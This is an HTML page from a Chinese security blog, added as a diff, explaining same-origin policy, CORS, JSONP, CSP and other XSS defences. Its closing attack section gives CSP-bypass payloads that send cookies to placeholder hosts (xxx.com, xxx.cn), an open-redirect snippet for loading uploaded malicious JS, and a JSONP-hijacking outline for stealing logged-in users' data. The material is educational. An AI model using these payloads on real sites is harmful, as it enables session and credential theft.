@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>重温XSS - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u91cd\u6e29XSS", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+          ]},
+          {title: "\u540c\u6e90\u7b56\u7565\u4e0e\u8de8\u57df", url: "#_2", children: [
+              {title: "\u540c\u6e90\u7b56\u7565", url: "#_3" },
+              {title: "\u8de8\u57df", url: "#_6" },
+          ]},
+          {title: "CSP", url: "#csp", children: [
+              {title: "CSP\u89c4\u5219", url: "#csp_1" },
+              {title: "\u542f\u7528CSP", url: "#csp_2" },
+          ]},
+          {title: "\u4e00\u4e9b\u5176\u4ed6XSS\u4fdd\u62a4\u673a\u5236", url: "#xss_1", children: [
+              {title: "X-Frame", url: "#x-frame" },
+              {title: "XSS auditor", url: "#xss-auditor" },
+              {title: "httponly", url: "#httponly" },
+              {title: "htmlspecialchars", url: "#htmlspecialchars" },
+          ]},
+          {title: "\u653b\u51fb\u624b\u6bb5", url: "#_8", children: [
+              {title: "bypass csp", url: "#bypass-csp" },
+              {title: "JSONP \u52ab\u6301", url: "#jsonp_1" },
+              {title: "\u5e38\u7528\u89e6\u53d1\u70b9\u4e0ebypass", url: "#bypass" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/" class="btn btn-xs btn-link">
+        信息探测
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/" class="btn btn-xs btn-link">
+        判断不同数据库的方法tips
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="xss">重温XSS</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#title-XSS的一些基本概念datetags-外围打点">title: XSS的一些基本概念
+    date:
+    tags: 外围打点</a></li>
+<li><a href="#同源策略与跨域">同源策略与跨域</a><ul>
+<li><a href="#同源策略">同源策略</a><ul>
+<li><a href="#同源的定义">同源的定义</a></li>
+<li><a href="#同源策略的作用">同源策略的作用</a></li>
+</ul>
+</li>
+<li><a href="#跨域">跨域</a><ul>
+<li><a href="#CORS">CORS</a><ul>
+<li><a href="#实现原理">实现原理</a></li>
+</ul>
+</li>
+<li><a href="#JSONP">JSONP</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#CSP">CSP</a><ul>
+<li><a href="#CSP规则">CSP规则</a></li>
+<li><a href="#启用CSP">启用CSP</a></li>
+</ul>
+</li>
+<li><a href="#一些其他XSS保护机制">一些其他XSS保护机制</a><ul>
+<li><a href="#X-Frame">X-Frame</a></li>
+<li><a href="#XSS-auditor">XSS auditor</a></li>
+<li><a href="#httponly">httponly</a></li>
+<li><a href="#htmlspecialchars">htmlspecialchars</a></li>
+</ul>
+</li>
+<li><a href="#攻击手段">攻击手段</a><ul>
+<li><a href="#bypass-csp">bypass csp</a></li>
+<li><a href="#JSONP-劫持">JSONP 劫持</a></li>
+<li><a href="#常用触发点与bypass">常用触发点与bypass</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<p>title: XSS的一些基本概念
+date:
+tags: 外围打点</p>
+<hr />
+<h1 id="_2">同源策略与跨域</h1>
+<h2 id="_3">同源策略</h2>
+<h3 id="_4">同源的定义</h3>
+<p>若两个URL 协议，端口，host都相同，则这两个URL同源。
+这个方案叫做“协议/主机/端口元组”，或者直接是 “元组”</p>
+<p>同源策略又分为DOM同源策略(禁止对不同源的页面的DOM进行操作)和XMLHttpRequest(禁止XHR对象项不同源的服务器地址发起HTTP请求)同源策略</p>
+<h3 id="_5">同源策略的作用</h3>
+<p>限制一个JS脚本对不同源的URL进行操作。</p>
+<p>这么说可能会有点抽象，那不如看看下面的例子:</p>
+<p>1.如果没有DOM同源策略，就意味着一个页面可以对任意页面的DOM进行操作。那么就会导致以下安全问题:
+做一个假网站，并插入一个占满全页面的iframe指向一个登陆界面如银行登录界面。用户进来后会发现除了域名不同，其他都和正常的银行登陆界面一致。若用户输入了账号密码，那么我们就可以跨域读取到银行登陆界面的dom树，从而读取用户输入的账号密码。</p>
+<p>2.如果没有XMLHttpRequest，就意味着可以一个页面可以向任意页面发起HTTP请求。那么就会导致以下安全问题:
+当一个用户登陆了某个系统，如银行个人系统，此时银行网站会给用户返回cookie。如果用户此时访问了我们的恶意网站，就会执行我们恶意网站中的恶意AJAX代码，此AJAX代码会向银行网站发起HTTP请求，比如发起查询账户余额的请求（此时会默认附带用户的cookie）。银行页面发现cookie无误，就会返回请求的数据:账户余额，造成数据泄露。</p>
+<h2 id="_6">跨域</h2>
+<p>上面我们说了同源策略中，一个页面不能对不同源的页面进行操作。但是在实际情况中，还是有一些js标签能摆脱这种束缚,如script标签就能通过src属性获取不同源页面上的js代码，iframe能嵌入不同源站点的资源等等。
+这样的标签有如下</p>
+<pre><code class="language-纯文本">&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;
+&lt;img&gt; / &lt;video&gt; / &lt;audio&gt;
+&lt;object&gt; &lt;embed&gt; 和 &lt;applet&gt; 的插件
+@font-face
+&lt;frame&gt; 和 &lt;iframe&gt;
+</code></pre>
+<p>但仅仅是这样，有些时候还是无法达到业务的需求，我们有时需要突破这种限制来达到业务需求，也就是避开同源策略，以下是几种解决方案。</p>
+<h3 id="cors">CORS</h3>
+<p>CORS，即跨域资源共享，它是一个W3C标准，定义了必须访问跨域资源时，浏览器和服务器该如何协商。
+其实质就是以AJAX为载体，使用自定义HTTP头让浏览器与服务器进行协商，从而决定跨域请求是否应该成功。
+所以实现CORS通信的关键是服务器是否实现了CORS接口。</p>
+<p>另外，并不是所有浏览器都支持CORS，比如IE6,IE7,Opera min 不支持CORS。</p>
+<h4 id="_7">实现原理</h4>
+<p>浏览器把CORS的请求分成两类:简单请求与非简单请求</p>
+<p>简单请求:
+满足以下条件，即为简单请求</p>
+<pre><code class="language-纯文本">请求方法是以下三种方法之一：
+HEAD
+GET
+POST
+
+且HTTP的头信息不超出以下几种字段：
+Accept
+Accept-Language
+Content-Language
+Last-Event-ID
+Content-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain
+</code></pre>
+<p>只要不满足以上条件，都为非简单请求。</p>
+<p>对于简单请求，其实现原理如下:</p>
+<p>1.在请求头中加一个额外头:Origin, 其包含发出请求的页面的协议，域名，端口，服务器以此来判断是否给予响应。
+2.服务器收到请求后，判别该Origin指向的站点能否跨域。若能跨域，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）；若不能跨域，则没有这个头部或者源信息不匹配（即Access-Control-Allow-Origin内容非*且与Origin不符）
+3.同时如果服务器返回的头中有 Access-Control-Allow-Credentials: true ，则说明可以跨域向服务器发送带有cookie的HTTP请求。</p>
+<p>对于非简单请求，它会实现进行预检，其原理如下:
+1.进行预检，以OPTIONS方法向服务器发送Origin头部，Access-Control-Request-Method头部（接下来的请求方法，如POST），Access-Control-Request-Headers（自定义头部信息，可选）
+2.服务器响应，有如下头:Access-Control-Allow-Origin,Access-Control-Allow-Methods(允许的请求方法)，Access-Control-Allow-Headers（允许的自定义头部信息），Access-Control-Max-Age（应该将预检请求缓存多长时间，以秒为单位）
+3.通过预检请求后，以后每次浏览器的CORS请求都会和简单请求一样。</p>
+<h3 id="jsonp">JSONP</h3>
+<p>我们不妨通过一个例子来窥视JSONP的实现原理。</p>
+<p>我们有如下文件test.html</p>
+<pre><code class="language-纯文本">&lt;html&gt;
+    &lt;head&gt;&lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;HI&lt;/h1&gt;
+        &lt;script&gt;
+            var fun1=function(data){
+                alert(data)
+            }
+        &lt;/script&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;http://192.168.111.1/a.js&quot;&gt;&lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>其包含的a.js如下</p>
+<pre><code class="language-纯文本">fun1(&quot;remote data&quot;);
+</code></pre>
+<p>访问test.html，成功触发弹窗，我们将test.html中的fun1函数称为回调函数</p>
+<p><img alt="image-20210322211050387" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322211050387.png" title="image-20210322211050387" /></p>
+<p>于是就出现了利用这种原理来实现跨域传输数据的方法：JSONP</p>
+<p>下面说说JSONP的具体实现流程:</p>
+<p>客户端:
+1.定义获取数据后的回调函数
+2.动态生成服务端JS进行引用的代码</p>
+<pre><code class="language-纯文本">关于此处第2点，我们可以说道说道。
+我们再用这个方法实现跨域时，怎么让远程JS知道我们本地的回调函数叫什么名字？
+这就需要通过一些手段动态生成服务端的JS代码了。
+比如我们可以通过get参数来控制其返回的本地回调函数名，如: http://a.com?callback=fun1
+</code></pre>
+<p>服务端:
+返回由回调函数名包裹的JSON数据，如</p>
+<pre><code class="language-纯文本">fun1({
+  &quot;key1&quot;:&quot;value1&quot;
+});
+</code></pre>
+<p>这里为什么要特别强调是JSON呢？因为JSON不仅可以简洁的表述复杂的数据，而且JS原生支持JSON，可以在客户端自由处理JSON数据，所以服务端多传回JSON数据，JSONP这个名字也是这么来的。</p>
+<h1 id="csp">CSP</h1>
+<p>CSP，即内容安全策略。它通过白名单策略，告诉客户端哪些外部资源可以加载和执行。
+同时需要注意的是，CSP目前有1.0 2.0 3.0 版本，每个版本的规则都有不同</p>
+<h2 id="csp_1">CSP规则</h2>
+<p>CSP通过定义一系列规则来实现安全管理。</p>
+<p>首先我们来看看一条CSP规则的范例</p>
+<pre><code class="language-纯文本">Content-Security-Policy: default-src https://host1.com https://host2.com; frame-src 'none'; object-src 'none'
+多个CSP指令间用分号隔开，多个指令值之间用空格隔开
+</code></pre>
+<p>下面是各个指令及其指令值的效果</p>
+<p>摘自<a href="https://blog.csdn.net/qq_37943295/article/details/79978761" title="https://blog.csdn.net/qq_37943295/article/details/79978761">https://blog.csdn.net/qq_37943295/article/details/79978761</a></p>
+<p><img alt="image-20210322214229302" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214229302.png" title="image-20210322214229302" /></p>
+<p><img alt="image-20210322214238476" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214238476.png" title="image-20210322214238476" /></p>
+<h2 id="csp_2">启用CSP</h2>
+<p>那么如何启用CSP呢？有两种方式</p>
+<p>1.在HTTP头添加
+在HTTP头响应添加content-security-policy头并写入CSP规则以后，就能启用CSP了</p>
+<p>图引用于<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" title="http://www.ruanyifeng.com/blog/2016/09/csp.html">http://www.ruanyifeng.com/blog/2016/09/csp.html</a></p>
+<p><img alt="image-20210322214736472" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214736472.png" title="image-20210322214736472" /></p>
+<p>2.在meta标签里添加
+向内添加如下内容</p>
+<pre><code class="language-纯文本">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;
+即可
+</code></pre>
+<h1 id="xss_1">一些其他XSS保护机制</h1>
+<h2 id="x-frame">X-Frame</h2>
+<p>X-Frame-Options 是一个响应头，指定此页面能否在\<frame>或者\<iframe>中插入.
+他有三个可选值:</p>
+<ul>
+<li>DENY
+    页面不能被嵌入到任何iframe或frame中</li>
+<li>SAMEORIGIN
+    页面只能被本站页面嵌入到iframe或者frame中</li>
+<li>ALLOW-FROM uri
+    表示该页面可以在指定来源的 frame 中展示。</li>
+</ul>
+<h2 id="xss-auditor">XSS auditor</h2>
+<h2 id="httponly">httponly</h2>
+<p>httponly 是一个针对cookie的保护机制。
+其实现原理是在response中对某一项cookie设置为HTTPONLY=true，从而使该cookie不能被document.cookie 读取。</p>
+<p>我们随便找个网站，发现其captch_session_v2开启了httponly</p>
+<p><img alt="image-20210323115121425" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210323115121425.png" title="image-20210323115121425" /></p>
+<p>随后我们通过document.cookie尝试去读取aptch_session_v2的值，发现其值并没有出现在返回内容中</p>
+<p><img alt="image-20210323115228944" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210323115228944.png" title="image-20210323115228944" /></p>
+<h2 id="htmlspecialchars">htmlspecialchars</h2>
+<p>htmlspecialchars是一个php函数，它可以将一些敏感字符转义</p>
+<pre><code class="language-纯文本">&amp; (AND) =&gt; &amp;amp;
+&quot; (双引号) =&gt; &amp;quot; (当ENT_NOQUOTES没有设置的时候) 
+' (单引号) =&gt; &amp;#039; (当ENT_QUOTES设置) 
+&lt; (小于号) =&gt; &amp;lt; 
+&gt; (大于号) =&gt; &amp;gt; 
+</code></pre>
+<h1 id="_8">攻击手段</h1>
+<h2 id="bypass-csp">bypass csp</h2>
+<p>csp，是可以被bypass的。我们接下来就想办法bypass csp来回传cookie</p>
+<p>1</p>
+<pre><code class="language-纯文本">default-src 'none';
+</code></pre>
+<p>可以通过meta标签实现重定向</p>
+<pre><code class="language-纯文本">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xxx.com/x.php?cookie=[cookie]&quot;&gt;
+</code></pre>
+<p>即，1秒后跳转至指定url</p>
+<p>2</p>
+<pre><code class="language-纯文本">script-src ‘self’ ‘unsafe-inline’
+</code></pre>
+<p>开放了内联脚本。我们可以通过window.location,windows.open或者meta标签实现页面跳转。也可以通过动态创建元素实现跳转</p>
+<pre><code class="language-纯文本">            var a = document.createElement(&quot;a&quot;);
+            a.href='http://www.baidu.com'+document.cookie;
+            a.click();
+</code></pre>
+<p>3</p>
+<pre><code class="language-纯文本">default-src 'self'; script-src 'self'
+</code></pre>
+<p>限制了只能加载本域JS脚本，同时禁止了内联脚本执行。
+不过问题不大，如果我们有一个上传点，我们可以上传一个恶意JS文件，上传后如果我们知道此JS文件上传位置与文件名且上传的位置是本域，然后通过XSS实现加载此恶意JS文件。</p>
+<p>另外在CSP1.0版本中，还可以通过以下方式进行跳转(现在不咋好用了)</p>
+<pre><code class="language-纯文本">&lt;link rel=&quot;prefetch&quot; href=&quot;http://xxx.cn&quot;&gt; (H5预加载)
+&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxx.cn&quot;&gt; （DNS预加载）
+</code></pre>
+<p>4</p>
+<pre><code class="language-纯文本">script-src http://www.a.com/b/ 
+</code></pre>
+<p>限制了只能从某特定路径去加载JS脚本
+对此一般的解决方法是看看此目录下有没有可控重定向的文件，比如这种</p>
+<pre><code class="language-纯文本">b/302.php
+&lt;?php Header(&quot;location: &quot;.$_GET['url'])?&gt;
+</code></pre>
+<p>我们就可以插入</p>
+<pre><code class="language-纯文本"> &lt;script src=&quot;b/302.php?url=http://a.com/upload/a.js&quot;&gt;  
+
+ &lt;/script&gt;
+</code></pre>
+<p>去加载我们上传的JS脚本（上传点自己找）</p>
+<h2 id="jsonp_1">JSONP 劫持</h2>
+<p>简单说一说</p>
+<p>首先存在网站B，它包含登录用户的ID,passwd等敏感信息。且有页面<a href="http://B.com/user?callback=" title="http://B.com/user?callback=">http://B.com/user?callback=</a>  用来进行JSONP跨域数据传输ID,PASSWD等信息，这是前提。
+用户登录B后，打开了我们的恶意网站A.com,A.com的内容为:</p>
+<pre><code class="language-纯文本">&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt;
+function Callback(result)
+{
+    将获取内容上传至恶意服务器的JS代码.....
+}
+</code></pre>
+<p>那么A网站就会向网站B跨域请求到敏感信息，并上传到恶意服务器保存。
+这就是JSONP劫持，此方法常用于水坑攻击</p>
+<h2 id="bypass">常用触发点与bypass</h2>
+<p><a href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html" title="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html">https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/" class="btn btn-xs btn-link">
+        信息探测
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/" class="btn btn-xs btn-link">
+        判断不同数据库的方法tips
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
